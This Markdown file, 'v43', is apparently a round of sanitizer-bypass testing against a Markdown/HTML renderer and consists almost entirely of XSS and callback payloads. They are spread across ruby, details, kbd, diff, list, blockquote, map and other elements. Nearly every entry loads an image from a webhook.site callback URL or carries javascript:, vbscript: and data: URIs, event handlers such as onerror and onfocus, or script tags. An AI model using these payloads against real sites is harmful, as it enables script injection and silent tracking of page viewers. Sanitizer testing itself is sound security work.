# v43: Ruby/Details/Diff/KBD Security Tests

> Inspired by your styling guide - testing those fancy elements!

---

## 1. Ruby Annotation Payloads

<!-- Can we hide callbacks in ruby annotations? -->

<ruby>Text<rt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-rt-img.gif"></rt></ruby>

<ruby><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-base-img.gif"><rt>annotation</rt></ruby>

<ruby>Status<rt><a href="javascript:alert(1)">XSS</a></rt></ruby>

<ruby onmouseover="alert(1)">Hover<rt>test</rt></ruby>

<ruby><img src=x onerror=alert(1)><rt>error</rt></ruby>

<ruby>Test<rt style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-style.gif)">styled</rt></ruby>

<ruby><rp>(<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-rp.gif"></rp><rt>test</rt><rp>)</rp></ruby>

<ruby>Multi<rt><rt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-double-rt.gif"></rt></rt></ruby>

---

## 2. Details/Summary Payloads

<!-- Collapsible content might bypass sanitizer -->

<details>
<summary><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/summary-img.gif"></summary>
Hidden content
</details>

<details open>
<summary>Auto-Open</summary>
<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/details-open.gif">
</details>

<details>
<summary onclick="alert(1)">Click Handler</summary>
Content
</details>

<details>
<summary><script>alert(1)</script></summary>
Script in summary
</details>

<details>
<summary>Nested Details</summary>
<details>
<summary><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/nested-details.gif"></summary>
Deep nested
</details>
</details>

<details style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/details-style.gif)">
<summary>Styled details</summary>
Content
</details>

<details data-x="<img src=https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/details-data.gif>">
<summary>Data attr</summary>
Content
</details>

---

## 3. KBD Deep Nesting Payloads

<!-- From your guide - deep nesting might confuse parser -->

<kbd>
<h1><code><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-h1-code.gif"></code></h1>
</kbd>

<kbd>
<kbd>
<kbd>
<kbd>
<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-nested-4.gif">
</kbd>
</kbd>
</kbd>
</kbd>

<kbd><script>alert(1)</script></kbd>

<kbd onkeydown="alert(1)">Press me</kbd>

<kbd style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-style.gif)">styled</kbd>

<kbd>
<pre>
<code>
<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-pre-code.gif">
</code>
</pre>
</kbd>

<kbd><samp><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-samp.gif"></samp></kbd>

---

## 4. Diff Code Block Injection

<!-- Can we inject through diff syntax? -->

```diff
- <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-minus.gif">
+ <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-plus.gif">
! <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-bang.gif">
@@ <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-at.gif"> @@
```

```diff
- <script>alert(1)</script>
+ <script>alert(2)</script>
```

```diff
- javascript:alert(1)
```

```html
<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/codeblock-html.gif">
```

```javascript
document.write('<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/codeblock-js.gif">')
```

---

## 5. Align Attribute Chains

<!-- Nested div align might have quirks -->

<div align="left">
<div align="center">
<div align="right">
<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/triple-align.gif">
</div>
</div>
</div>

<div align="left" onclick="alert(1)">
<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/align-onclick.gif">
</div>

<div align="javascript:alert(1)">
Bad align value
</div>

<p align="center"><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/p-align.gif"></p>

<center><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/center-tag.gif"></center>

---

## 6. Anchor + Image Combos

<!-- Links wrapping images -->

<a href="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-href-click">
<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-img.gif">
</a>

<a href="javascript:alert(1)"><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-js-img.gif"></a>

<a href="data:text/html,<script>alert(1)</script>"><img src="x"></a>

<a href="vbscript:alert(1)"><img src="x"></a>

<a href="//webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-proto-relative">Click</a>

<a href="https://github.com" onclick="location='https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-onclick'">Hijack</a>

<a href="#" onfocus="alert(1)" autofocus>Focus XSS</a>

---

## 7. SAMP/VAR/CODE Payloads

<!-- From your guide's formatting tags -->

<samp><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/samp-img.gif"></samp>

<var><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/var-img.gif"></var>

<code><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/code-img.gif"></code>

<tt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/tt-img.gif"></tt>

<pre><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/pre-img.gif"></pre>

<output><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/output-img.gif"></output>

---

## 8. List Element Payloads

<ul>
<li><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/li-img.gif"></li>
</ul>

<ol>
<li value="javascript:alert(1)">Bad value</li>
</ol>

<dl>
<dt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/dt-img.gif"></dt>
<dd><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/dd-img.gif"></dd>
</dl>

<menu><li><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/menu-li.gif"></li></menu>

---

## 9. Text Formatting + Callbacks

<b><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/b-img.gif"></b>

<i><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/i-img.gif"></i>

<strong><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/strong-img.gif"></strong>

<em><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/em-img.gif"></em>

<mark><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/mark-img.gif"></mark>

<del><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/del-img.gif"></del>

<ins><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ins-img.gif"></ins>

<s><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/s-img.gif"></s>

<u><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/u-img.gif"></u>

<small><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/small-img.gif"></small>

<big><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/big-img.gif"></big>

<sub><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/sub-img.gif"></sub>

<sup><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/sup-img.gif"></sup>

---

## 10. Blockquote + Alert Payloads

> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/quote-img.gif">

>> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/nested-quote-img.gif">

> [!NOTE]
> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-note-img.gif">

> [!WARNING]
> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-warn-img.gif">

> [!CAUTION]
> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-caution-img.gif">

> [!TIP]
> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-tip-img.gif">

> [!IMPORTANT]
> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-important-img.gif">

---

## 11. HR/BR Edge Cases

<hr style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/hr-style.gif)">

<hr onclick="alert(1)">

<br clear="all" style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/br-style.gif)">

---

## 12. Figure/Figcaption

<figure>
<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/figure-img.gif">
<figcaption><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/figcaption-img.gif"></figcaption>
</figure>

---

## 13. Picture/Source Elements

<picture>
<source srcset="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/source-srcset.gif">
<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/picture-img.gif">
</picture>

---

## 14. Map/Area Elements

<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/map-img.gif" usemap="#testmap">
<map name="testmap">
<area shape="rect" coords="0,0,100,100" href="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/area-click">
<area shape="rect" coords="0,0,100,100" href="javascript:alert(1)">
</map>

---

## 15. Abbreviation/DFN

<abbr title="<img src=https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/abbr-title.gif>">XSS</abbr>

<dfn><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/dfn-img.gif"></dfn>

<acronym title="<img src=x onerror=alert(1)>">ABC</acronym>

---

**v43 - Testing styling guide elements for security bypasses**
